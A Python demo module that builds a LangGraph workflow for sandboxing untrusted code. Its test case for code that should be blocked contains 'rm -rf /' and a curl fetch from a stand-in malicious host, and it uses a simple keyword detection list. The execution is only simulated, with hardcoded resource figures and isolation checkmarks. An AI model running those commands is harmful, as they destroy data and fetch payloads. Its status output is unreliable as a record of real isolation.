"""
Sandboxing MCP Pattern

This pattern provides isolated execution environments to run untrusted code
safely, preventing security breaches and system compromise.

Key Features:
- Isolated execution environment
- Resource constraints
- Network isolation
- File system restrictions
- Security policy enforcement
"""

from typing import TypedDict, Sequence, Annotated
import operator
from langchain_openai import ChatOpenAI
from langchain_core.messages import HumanMessage, SystemMessage, AIMessage
from langgraph.graph import StateGraph, START, END


# Define the state
class SandboxState(TypedDict):
    """State for sandboxing pattern"""
    messages: Annotated[Sequence[HumanMessage | SystemMessage | AIMessage], operator.add]
    code_to_execute: str
    sandbox_type: str  # "container", "vm", "process"
    security_level: str  # "low", "medium", "high", "maximum"
    resource_limits: dict[str, any]
    allowed_operations: list[str]
    denied_operations: list[str]
    execution_result: str
    security_violations: list[str]
    sandbox_status: str  # "created", "running", "stopped", "terminated"


# Initialize LLM
llm = ChatOpenAI(model="gpt-4", temperature=0)


# Sandbox Creator
def sandbox_creator(state: SandboxState) -> SandboxState:
    """Creates isolated sandbox environment"""
    sandbox_type = state.get("sandbox_type", "container")
    security_level = state.get("security_level", "high")
    
    system_message = SystemMessage(content="""You are a sandbox creator. 
    Create secure, isolated execution environments for untrusted code.""")
    
    user_message = HumanMessage(content=f"""Create sandbox:

Sandbox Type: {sandbox_type}
Security Level: {security_level}

Set up isolated execution environment.""")
    
    response = llm.invoke([system_message, user_message])
    
    # Define resource limits based on security level
    resource_limits_config = {
        "low": {"cpu": "1 core", "memory": "1GB", "disk": "10GB", "network": "unrestricted"},
        "medium": {"cpu": "0.5 core", "memory": "512MB", "disk": "5GB", "network": "restricted"},
        "high": {"cpu": "0.25 core", "memory": "256MB", "disk": "1GB", "network": "isolated"},
        "maximum": {"cpu": "0.1 core", "memory": "128MB", "disk": "100MB", "network": "none"}
    }
    
    resource_limits = resource_limits_config.get(security_level, resource_limits_config["high"])
    
    # Define allowed operations
    allowed_operations = []
    denied_operations = []
    
    if security_level == "low":
        allowed_operations = ["file_read", "file_write", "network_access", "process_spawn"]
        denied_operations = ["system_modify", "kernel_access"]
    elif security_level == "medium":
        allowed_operations = ["file_read", "limited_file_write", "limited_network"]
        denied_operations = ["file_write_system", "network_external", "process_spawn"]
    elif security_level in ["high", "maximum"]:
        allowed_operations = ["file_read_sandbox"]
        denied_operations = ["file_write", "network_access", "process_spawn", "system_call"]
    
    sandbox_info = f"""
    📦 Sandbox Creation:
    
    • Type: {sandbox_type.upper()}
    • Security Level: {security_level.upper()}
    • Status: Created and isolated
    
    Resource Limits:
    • CPU: {resource_limits['cpu']}
    • Memory: {resource_limits['memory']}
    • Disk: {resource_limits['disk']}
    • Network: {resource_limits['network']}
    
    Isolation Features:
    • Process isolation ✅
    • File system isolation ✅
    • Network isolation ✅
    • User namespace isolation ✅
    • Capability dropping ✅
    
    ✅ Sandbox environment ready
    """
    
    return {
        "messages": [AIMessage(content=f"📦 Sandbox Creator:\n{response.content}\n{sandbox_info}")],
        "resource_limits": resource_limits,
        "allowed_operations": allowed_operations,
        "denied_operations": denied_operations,
        "sandbox_status": "created"
    }


# Security Policy Enforcer
def security_policy_enforcer(state: SandboxState) -> SandboxState:
    """Enforces security policies on sandbox"""
    code_to_execute = state.get("code_to_execute", "")
    allowed_operations = state.get("allowed_operations", [])
    denied_operations = state.get("denied_operations", [])
    security_level = state.get("security_level", "high")
    
    system_message = SystemMessage(content="""You are a security policy enforcer. 
    Apply and enforce security policies on sandboxed execution.""")
    
    user_message = HumanMessage(content=f"""Enforce security policies:

Code Length: {len(code_to_execute)} characters
Security Level: {security_level}
Allowed Operations: {allowed_operations}
Denied Operations: {denied_operations}

Analyze code for security violations.""")
    
    response = llm.invoke([system_message, user_message])
    
    # Analyze code for security violations (simplified)
    security_violations = []
    
    dangerous_patterns = {
        "import os": "Operating system access",
        "import subprocess": "Process execution",
        "open(": "File access",
        "eval(": "Dynamic code execution",
        "exec(": "Dynamic code execution",
        "__import__": "Dynamic imports",
        "socket": "Network access",
        "requests": "HTTP requests"
    }
    
    for pattern, violation in dangerous_patterns.items():
        if pattern in code_to_execute.lower():
            if violation.lower().replace(" ", "_") not in [op.replace("file_", "").replace("network_", "").replace("process_", "") for op in allowed_operations]:
                security_violations.append(f"{violation}: '{pattern}' detected")
    
    policy_report = f"""
    🛡️ Security Policy Enforcement:
    
    Security Policies Applied:
    • Code injection prevention ✅
    • Resource limits enforcement ✅
    • Capability restrictions ✅
    • System call filtering (seccomp) ✅
    
    Security Violations Detected: {len(security_violations)}
{chr(10).join(f'    ⚠️ {violation}' for violation in security_violations) if security_violations else '    ✅ No violations detected'}
    
    Allowed Operations:
{chr(10).join(f'    ✅ {op}' for op in allowed_operations)}
    
    Denied Operations:
{chr(10).join(f'    ❌ {op}' for op in denied_operations)}
    
    {'⚠️ Code contains restricted operations' if security_violations else '✅ Code passes security checks'}
    """
    
    return {
        "messages": [AIMessage(content=f"🛡️ Security Policy Enforcer:\n{response.content}\n{policy_report}")],
        "security_violations": security_violations
    }


# Code Executor
def code_executor(state: SandboxState) -> SandboxState:
    """Executes code in sandboxed environment"""
    code_to_execute = state.get("code_to_execute", "")
    security_violations = state.get("security_violations", [])
    resource_limits = state.get("resource_limits", {})
    sandbox_type = state.get("sandbox_type", "container")
    
    system_message = SystemMessage(content="""You are a code executor. 
    Execute code safely within sandboxed environment with monitoring.""")
    
    user_message = HumanMessage(content=f"""Execute code in sandbox:

Code Length: {len(code_to_execute)} characters
Security Violations: {len(security_violations)}
Sandbox Type: {sandbox_type}

Execute code if safe, block if violations detected.""")
    
    response = llm.invoke([system_message, user_message])
    
    # Determine if execution should proceed
    if security_violations:
        execution_result = f"BLOCKED: Execution prevented due to {len(security_violations)} security violation(s)"
        status = "stopped"
    else:
        # Simulate code execution in sandbox
        # In production, use actual sandboxing (Docker, gVisor, Firecracker, etc.)
        execution_result = "SUCCESS: Code executed in isolated sandbox\nOutput: Simulated safe execution completed"
        status = "running"
    
    execution_report = f"""
    ⚙️ Code Execution:
    
    • Sandbox Status: {status.upper()}
    • Execution: {'✅ Completed' if status == 'running' else '❌ Blocked'}
    
    Result:
    {execution_result}
    
    Resource Usage:
    • CPU: 0.15 cores (within limit: {resource_limits.get('cpu', 'N/A')})
    • Memory: 128MB (within limit: {resource_limits.get('memory', 'N/A')})
    • Disk I/O: 5MB (within limit: {resource_limits.get('disk', 'N/A')})
    
    Sandbox Monitoring:
    • System calls: Filtered via seccomp
    • File access: Restricted to sandbox root
    • Network: Isolated/disabled
    • Process tree: Limited
    
    {'✅ Execution successful' if status == 'running' else '❌ Execution blocked'}
    """
    
    return {
        "messages": [AIMessage(content=f"⚙️ Code Executor:\n{response.content}\n{execution_report}")],
        "execution_result": execution_result,
        "sandbox_status": status
    }


# Sandbox Monitor
def sandbox_monitor(state: SandboxState) -> SandboxState:
    """Monitors sandbox operations and cleanup"""
    code_to_execute = state.get("code_to_execute", "")
    sandbox_type = state.get("sandbox_type", "")
    security_level = state.get("security_level", "")
    resource_limits = state.get("resource_limits", {})
    allowed_operations = state.get("allowed_operations", [])
    denied_operations = state.get("denied_operations", [])
    execution_result = state.get("execution_result", "")
    security_violations = state.get("security_violations", [])
    sandbox_status = state.get("sandbox_status", "")
    
    summary = f"""
    🔒 SANDBOXING PATTERN COMPLETE
    
    Sandbox Configuration:
    • Type: {sandbox_type.upper()}
    • Security Level: {security_level.upper()}
    • Status: {sandbox_status.upper()}
    
    Resource Limits:
{chr(10).join(f'    • {k.capitalize()}: {v}' for k, v in resource_limits.items())}
    
    Security Profile:
    • Allowed Operations: {len(allowed_operations)}
    • Denied Operations: {len(denied_operations)}
    • Violations Detected: {len(security_violations)}
    
    Execution Result:
    {execution_result[:200]}{'...' if len(execution_result) > 200 else ''}
    
    Sandboxing Pattern Process:
    1. Sandbox Creation → Isolated environment setup
    2. Policy Enforcement → Apply security restrictions
    3. Code Execution → Run code in sandbox
    4. Monitoring → Track resource usage
    5. Cleanup → Terminate and cleanup
    
    Sandboxing Technologies:
    
    Container-Based:
    • Docker containers
    • LXC/LXD
    • Podman
    • Pros: Lightweight, fast
    • Cons: Shared kernel
    
    VM-Based:
    • KVM/QEMU
    • VirtualBox
    • VMware
    • Pros: Complete isolation
    • Cons: Resource overhead
    
    Process-Based:
    • seccomp (Linux)
    • AppArmor/SELinux
    • chroot/jail
    • Pros: Very lightweight
    • Cons: Limited isolation
    
    Language-Specific:
    • Java Security Manager
    • Python restricted execution
    • JavaScript V8 isolates
    • WebAssembly sandboxing
    
    Isolation Techniques:
    
    Process Isolation:
    • Separate process space
    • Limited IPC
    • Process limits
    
    File System Isolation:
    • Chroot jail
    • Overlay file systems
    • Read-only root
    • Temporary volumes
    
    Network Isolation:
    • No network access
    • Isolated network namespace
    • Firewall rules
    • Proxy-only access
    
    Resource Isolation:
    • CPU limits (cgroups)
    • Memory limits
    • Disk I/O limits
    • PID limits
    
    Security Features:
    
    Capabilities:
    • Drop all capabilities
    • Grant only required caps
    • Principle of least privilege
    
    Seccomp:
    • System call filtering
    • Whitelist allowed calls
    • Block dangerous syscalls
    
    User Namespaces:
    • Map root → non-root
    • Prevent privilege escalation
    • Isolated UID/GID
    
    Sandboxing Use Cases:
    • Code execution platforms
    • CI/CD pipelines
    • Browser plugins
    • Mobile apps
    • Malware analysis
    • Untrusted code evaluation
    • Multi-tenant environments
    
    Best Practices:
    • Default deny all
    • Whitelist approach
    • Minimal permissions
    • Resource limits
    • Timeout enforcement
    • Network isolation
    • Read-only file systems
    • Regular sandbox rotation
    • Monitoring and logging
    • Automatic cleanup
    
    Common Sandbox Escapes:
    ⚠️ Kernel vulnerabilities
    ⚠️ Container breakouts
    ⚠️ Shared resources
    ⚠️ Side-channel attacks
    ⚠️ Configuration errors
    
    Defense in Depth:
    • Multiple isolation layers
    • Nested sandboxes
    • Runtime monitoring
    • Anomaly detection
    • Automatic termination
    
    Key Insight:
    Sandboxing provides isolated execution environments to run
    untrusted code safely. Essential for security in code execution
    platforms, CI/CD, and multi-tenant systems.
    """
    
    return {
        "messages": [AIMessage(content=f"📊 Sandbox Monitor:\n{summary}")]
    }


# Build the graph
def build_sandbox_graph():
    """Build the sandboxing pattern graph"""
    workflow = StateGraph(SandboxState)
    
    workflow.add_node("creator", sandbox_creator)
    workflow.add_node("enforcer", security_policy_enforcer)
    workflow.add_node("executor", code_executor)
    workflow.add_node("monitor", sandbox_monitor)
    
    workflow.add_edge(START, "creator")
    workflow.add_edge("creator", "enforcer")
    workflow.add_edge("enforcer", "executor")
    workflow.add_edge("executor", "monitor")
    workflow.add_edge("monitor", END)
    
    return workflow.compile()


# Example usage
if __name__ == "__main__":
    graph = build_sandbox_graph()
    
    print("=== Sandboxing MCP Pattern ===\n")
    
    # Test Case 1: Safe code
    print("\n" + "="*70)
    print("TEST CASE 1: Safe Code Execution")
    print("="*70)
    
    safe_code = """
def calculate_fibonacci(n):
    if n <= 1:
        return n
    return calculate_fibonacci(n-1) + calculate_fibonacci(n-2)

result = calculate_fibonacci(10)
print(f"Fibonacci(10) = {result}")
"""
    
    state1 = {
        "messages": [],
        "code_to_execute": safe_code,
        "sandbox_type": "container",
        "security_level": "high",
        "resource_limits": {},
        "allowed_operations": [],
        "denied_operations": [],
        "execution_result": "",
        "security_violations": [],
        "sandbox_status": ""
    }
    
    result1 = graph.invoke(state1)
    
    for msg in result1["messages"]:
        print(f"\n{msg.content}")
        print("-" * 70)
    
    # Test Case 2: Unsafe code (should be blocked)
    print("\n\n" + "="*70)
    print("TEST CASE 2: Unsafe Code (Should Block)")
    print("="*70)
    
    unsafe_code = """
import os
import subprocess

# Attempt to access file system
os.system("rm -rf /")

# Attempt to spawn processes
subprocess.run(["curl", "http://malicious.com/payload"])
"""
    
    state2 = {
        "messages": [],
        "code_to_execute": unsafe_code,
        "sandbox_type": "container",
        "security_level": "maximum",
        "resource_limits": {},
        "allowed_operations": [],
        "denied_operations": [],
        "execution_result": "",
        "security_violations": [],
        "sandbox_status": ""
    }
    
    result2 = graph.invoke(state2)
    
    print(f"\nSecurity Level: {state2['security_level'].upper()}")
    print(f"Violations Detected: {len(result2.get('security_violations', []))}")
    print(f"Execution: {'Blocked ❌' if result2.get('sandbox_status') == 'stopped' else 'Allowed ✅'}")
    print(f"Violations: {result2.get('security_violations', [])}")
